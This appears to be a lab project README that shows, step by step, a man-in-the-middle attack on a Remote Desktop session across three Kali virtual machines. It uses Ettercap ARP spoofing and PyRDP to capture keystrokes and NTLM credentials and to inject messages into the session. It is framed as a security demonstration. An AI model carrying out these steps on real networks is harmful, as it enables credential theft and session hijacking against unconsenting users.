
# RDP MITM Attack Project

## Objective
Demonstrate a Man-in-the-Middle (MITM) attack on a Remote Desktop Protocol (RDP) session to capture sensitive data and highlight the importance of securing remote connections.

## Prerequisites
- **Operating System**: Kali Linux (3 virtual machines)
- **Tools**:
  - PyRDP (RDP MITM tool)
  - Ettercap (ARP spoofing)
  - Remmina (RDP client)
  - Wireshark (optional, for traffic analysis)
  - xRDP (RDP service on the server machine)

---

## Installation Steps

### Step 1: Environment Setup

#### Install xRDP on Machine A (Server)
```bash
sudo apt update
sudo apt install xrdp -y
sudo systemctl enable xrdp
sudo systemctl start xrdp
sudo ufw allow 3389/tcp
```

#### Verify xRDP Installation
```bash
sudo systemctl status xrdp
```

#### Install Remmina on Machine B (Client)
```bash
sudo apt update
sudo apt install remmina remmina-plugin-rdp -y
```

#### Install Tools on Machine C (MITM)
```bash
sudo apt update
sudo apt install ettercap-text-only -y
pip install pyrdp
sudo apt install wireshark -y
```

---

### Step 2: ARP Spoofing Configuration on Machine C

#### Launch Ettercap
```bash
sudo ettercap -G
```
1. Select Network Interface.
2. Scan for Hosts in the Network.
3. Add Target 1: Machine A (Server).
4. Add Target 2: Machine B (Client).
5. Enable ARP Spoofing.

---

### Step 3: Launch PyRDP on Machine C
```bash
pyrdp-mitm --output-dir ./logs
```

---

### Step 4: Establish RDP Connection from Machine B to Machine A
1. Launch Remmina on Machine B.
2. Configure RDP Connection to the IP of Machine A.

---

### Step 5: Monitor and Analyze Traffic on Machine C

#### View Logs Captured by PyRDP
```bash
ls ./logs
```

#### Analyze Captured Keystrokes and Credentials
```bash
cat ./logs/mitm.log
cat ./logs/ntlmssp.log
```

#### Optional: Analyze Network Traffic with Wireshark
```bash
sudo wireshark
```

---

### Step 6: Inject Commands into RDP Session
```bash
pyrdp-inject --target <Target IP> --message "Hello from MITM"
```

---

### Additional Verification Commands

#### Verify ARP Table on Machine B
```bash
arp -a
```

#### Verify Open Ports on Machine A
```bash
sudo netstat -tuln | grep 3389
```

#### Check Network Connectivity
```bash
ping <IP of Machine A>
```
